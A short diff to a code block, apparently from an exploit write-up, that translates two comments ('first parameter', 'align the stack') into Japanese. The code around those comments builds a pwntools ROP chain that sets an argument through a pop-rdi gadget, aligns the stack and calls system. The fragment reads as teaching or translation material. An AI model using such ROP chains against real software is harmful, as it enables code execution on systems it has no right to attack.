@@ -17,8 +17,8 @@ ret = elf.address + 0x2439
 
 [...]
 rop.raw(POP_RDI)
-rop.raw(0x4)        # first parameter
-rop.raw(ret)        # align the stack
+rop.raw(0x4)        # 第1引数
+rop.raw(ret)        # スタックをアラインする
 rop.raw(system)
 ```
 
